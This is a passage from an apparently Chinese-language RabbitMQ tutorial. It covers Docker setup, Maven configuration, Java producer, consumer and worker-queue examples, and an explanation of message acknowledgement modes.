class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker load -i mq.tar<br></code></pre></td></tr></table></figure><p>执行下面的命令来运行MQ容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run \<br> -e RABBITMQ_DEFAULT_USER=admin \<br> -e RABBITMQ_DEFAULT_PASS=admin \<br> --name Rabbit \<br> --hostname mq \<br> -p 15672:15672 \<br> -p 5672:5672 \<br> -d \<br> rabbitmq:3-management<br></code></pre></td></tr></table></figure><h1 id="3-helloworld"><a class="markdownIt-Anchor" href="#3-helloworld"></a> 3. HelloWorld</h1><p>在本教程的这一部分中，我们将用 Java 编写两个程序。发送单个消息的生产者和接收消息并打印</p><p>出来的消费者。我们将介绍 Java API 中的一些细节。</p><p>在下图中，“ P”是我们的生产者，“ C”是我们的消费者。中间的框是一个队列-RabbitMQ 代</p><p>表使用者保留的消息缓冲区</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112132650794.png" alt="image-20230112132650794" /></p><h2 id="31-创建开发环境"><a class="markdownIt-Anchor" href="#31-创建开发环境"></a> 3.1 创建开发环境</h2><p>创建一个Maven项目：rabbitmq-hello，POM如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.rabbitmq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>amqp-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="32-生产者代码"><a class="markdownIt-Anchor" href="#32-生产者代码"></a> 3.2 生产者代码</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112132743939.png" alt="image-20230112132743939" /></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> String QUEUE_NAME=<span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// 发消息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// 创建一个连接工厂</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        <span class="hljs-comment">// 工厂IP连接RabbitMQ的队列</span><br>        factory.setHost(<span class="hljs-string">&quot;192.168.23.132&quot;</span>);<br>        <span class="hljs-comment">// 用户名</span><br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-comment">// 密码</span><br>        factory.setPassword(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        factory.setPort(<span class="hljs-number">5672</span>);<br><br>        <span class="hljs-comment">// 创建连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-comment">// 获取信道</span><br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            * 生成一个队列</span><br><span class="hljs-comment">            * 参数1：队列名称</span><br><span class="hljs-comment">            * 参数2：队列里面的消息是否持久化，默认情况下，消息存储在内存中</span><br><span class="hljs-comment">            * 参数3：该队列是否只供一个消费者进行消费，是否进行消费共享，true可以多个消费者消费，</span><br><span class="hljs-comment">            *        false只能一个消费者消费</span><br><span class="hljs-comment">            * 参数4：是否自动删除：最后一个消费者断开连接之后，该队列是否自动删除，true则自动删除，</span><br><span class="hljs-comment">            *        false不自动删除</span><br><span class="hljs-comment">            * 参数5：其他参数</span><br><span class="hljs-comment">        * */</span><br>        channel.queueDeclare(QUEUE_NAME,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 发消息</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 发送一个消息</span><br><span class="hljs-comment">        * 参数1：发送到哪个交换机</span><br><span class="hljs-comment">        * 参数2：路由的key值是那个，本次是队列的名称</span><br><span class="hljs-comment">        * 参数3：其他参数信息</span><br><span class="hljs-comment">        * 参数4：发送消息的消息体</span><br><span class="hljs-comment">        * */</span><br>        channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        System.out.println(<span class="hljs-string">&quot;消息发送完毕！&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：如果报connection error，考虑是端口号没有开放的问题。连接服务，请求的端口号是<code>5672</code>，而可视化工具服务，请求的是<code>15672</code>，<code>因此需要开启5672跟15672两个端口</code>，测试连接成功！</p><h2 id="33-消费者代码"><a class="markdownIt-Anchor" href="#33-消费者代码"></a> 3.3 消费者代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// 接受消息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// 创建连接工厂</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        factory.setHost(<span class="hljs-string">&quot;192.168.23.132&quot;</span>);<br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        factory.setPassword(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br><br>        <span class="hljs-comment">// 声明 接受消息</span><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        <span class="hljs-comment">// 声明 取消消息</span><br>        <span class="hljs-type">CancelCallback</span> <span class="hljs-variable">cancelCallback</span> <span class="hljs-operator">=</span> consumer -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;消息消费被中断&quot;</span>);<br>        &#125;;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 消费者接收消息</span><br><span class="hljs-comment">        * 参数1：表示消费哪个UI列</span><br><span class="hljs-comment">        * 参数2：消费成功之后，是否需要自动应答，true表示自动应答，false表示手动应答</span><br><span class="hljs-comment">        * 参数3：消费者成功消费的回调</span><br><span class="hljs-comment">        * 参数4：消费者取消消费的回调</span><br><span class="hljs-comment">         */</span><br>        channel.basicConsume(QUEUE_NAME,<span class="hljs-literal">true</span>,deliverCallback,cancelCallback);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-work-queues"><a class="markdownIt-Anchor" href="#4-work-queues"></a> 4. <strong>Work Queues</strong></h1><blockquote><p>简介</p></blockquote><p>工作队列(又称任务队列)的主要思想是避免立即执行资源密集型任务，而不得不等待它完成。相反我们安排任务在之后执行。我们把任务封装为消息并将其发送到队列。在后台运行的工作进程将弹出任务并最终执行作业。当有多个工作线程时，这些工作线程将一起处理这些任务。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112143015734.png" alt="image-20230112143015734" /></p><h2 id="41-实现工作队列"><a class="markdownIt-Anchor" href="#41-实现工作队列"></a> 4.1 实现工作队列</h2><blockquote><p>抽取连接工厂攻击类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 此类为连接工厂创建信道的工具类</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMqUtils</span> &#123;<br>     <span class="hljs-comment">// 得到一个连接的channel</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Channel <span class="hljs-title function_">getChannel</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// 创建一个连接工厂</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br>        factory.setHost(<span class="hljs-string">&quot;192.168.23.132&quot;</span>);<br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        factory.setPassword(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        com.rabbitmq.client.<span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <span class="hljs-keyword">return</span> channel;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>工作线程代码</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.rabbitmq.client.CancelCallback;<br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> com.rabbitmq.client.DeliverCallback;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.workqueues]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 14:35]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker01</span> &#123;<br><br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// 接受消息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">// 接受消息参数</span><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;接受到的消息：&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br><br>        &#125;;<br><br>        <span class="hljs-comment">// 取消消费参数</span><br>        <span class="hljs-type">CancelCallback</span> <span class="hljs-variable">cancelCallback</span> <span class="hljs-operator">=</span> consumerTag -&gt; &#123;<br>            System.out.println(consumerTag+<span class="hljs-string">&quot;消费者取消消费借口回调逻辑&quot;</span>);<br>        &#125;;<br>        System.out.println(<span class="hljs-string">&quot;work2已启动&quot;</span>);<br>        <span class="hljs-comment">// 消息的接受</span><br>        channel.basicConsume(QUEUE_NAME,<span class="hljs-literal">true</span>,deliverCallback,cancelCallback);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>同时开启2个工作线程：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112145927231.png" alt="image-20230112145927231" /></p><p>然后启动工作线程1：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112150022554.png" alt="image-20230112150022554" /></p><p>修改输出信息，作为工作线程2：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112150048071.png" alt="image-20230112150048071" /></p><blockquote><p>生产者代码</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task01</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// 发送大量消息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">// 队列的声明</span><br>        channel.queueDeclare(QUEUE_NAME,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 从控制台中输入消息</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;发送消息完成：&quot;</span>+ message);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>测试</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151409072.png" alt="image-20230112151409072" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151401692.png" alt="image-20230112151401692" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151351087.png" alt="image-20230112151351087" /></p><h2 id="42-消息应答"><a class="markdownIt-Anchor" href="#42-消息应答"></a> 4.2 消息应答</h2><blockquote><p>概念</p></blockquote><ol><li>消费者完成一个任务可能需要一段时间，如果其中一个消费者处理一个长的任务并仅只完成了部分突然它挂掉了，会发生什么情况。RabbitMQ一旦向消费者传递了一条消息，便立即将该消息标记为删除。在这种情况下，突然有个消费者挂掉了，我们将丢失正在处理的消息。以及后续发送给该消费这的消息，国为它无法接收到。</li><li>为了保证消息在发送过程中不丢失，RabbitMQ引入消息应答机制，消息应答就是:消费者在接收到消息并且处理该消息之后，告诉RabbitMQ它已经处理了，RabbitMQ可以把该消息删除了。</li></ol><blockquote><p>自动应答</p></blockquote><p>消息发送后立即被认为已经传送成功，这种模式需要在高吞吐量和数据传输安全性方面做权衡,因为这种模式如果消息在接收到之前，消费者那边出现连接或者channel关闭，那么消息就丢失了,当然另一方面这种模式消费者那边可以传递过载的消息，没有对传递的消息数量进行限制,当然这样有可能使得消费者这边由于接收太多还来不及处理的消息，导致这些消息的积压，最终使得内存耗尽，最终这些消费者线程被操作系统杀死，所以这种模式仅适用在消费者可以高效并以某种速率能够处理这些消息的情况下使用。</p><blockquote><p>消息应答的方法</p></blockquote><ol><li><p>Channel.basicAck(用于肯定确认)</p><p>RabbitMQ已知道该消息并且成功处理，可以将其丢弃</p></li><li><p>Channel.basicNack(用于否定确认)</p></li><li><p>Channel.basicReject(用于否定确认)，与Channel.basicNack相比少了一个参数，不处理该消息了，直接拒绝，可以将其丢弃了。</p></li></ol><blockquote><p>Multiple的解释</p></blockquote><p>手动应答的好处是<code>可以批量应答并且减少网络拥堵</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151637541.png" alt="image-20230112151637541" /></p><p>multiple的true和false是不同的意思：</p><ol><li>true表示批量应答channel上未应答的消息，比如channel上有传送tag的消息5,6,7,8,，当前tag是8，那么此时5-8的这些还未应答的消息就会被确认收到消息应答</li><li>false同上面相比只会应答tag=8的消息，5,6,7这三个消息依然不会被确认收到消息应答</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154935516.png" alt="image-20230112154935516" /></p><blockquote><p>消息自动重新入队</p></blockquote><p>如果消费者由于某些原因失去连接(其通道已关闭，连接已关闭或TCP连接丢失)，导致消息未发送ACK确认，RabbitMQ将了解到消息未完全处理，并将对其重新排队。如果此时其他消费者可以处理，它将很快将其重新分发给另一个消费者。这样，即使某个消费者偶尔死亡，也可以确保不会丢失任何消息。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151757010.png" alt="image-20230112151757010" /></p><blockquote><p>消息手动应答</p></blockquote><ol><li><p>生产者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 消息在手动应答时是不丢失、放回队列中重新消费</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task2</span> &#123;<br><br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TASK_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ack_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">// 声明队列</span><br>        channel.queueDeclare(TASK_QUEUE_NAME,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,TASK_QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;生产者发出消息：&quot;</span>+message);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 消费者</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker03</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TASK_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ack_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span 